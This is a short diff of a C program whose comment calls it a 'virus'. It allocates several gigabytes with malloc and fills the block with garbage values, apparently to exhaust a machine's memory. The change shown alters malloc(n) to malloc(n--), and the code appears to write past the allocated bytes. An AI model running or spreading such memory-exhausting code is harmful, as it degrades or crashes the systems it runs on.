@@ -5,7 +5,7 @@ int main () {
 	 * this DUMBNESS of malloc() is what makes the virus tick.
 	 */
 	size_t n = (COEFFICIENT * sizeof (size_t) * 1024 * 1024 * 1024);
-	size_t *ptr = (size_t *) malloc (n);
+	size_t *ptr = (size_t *) malloc (n--);
 	while (n != 0) {
 		// just put in some garbage, 18 dig
 		*(ptr ++) = 193848392937585938;
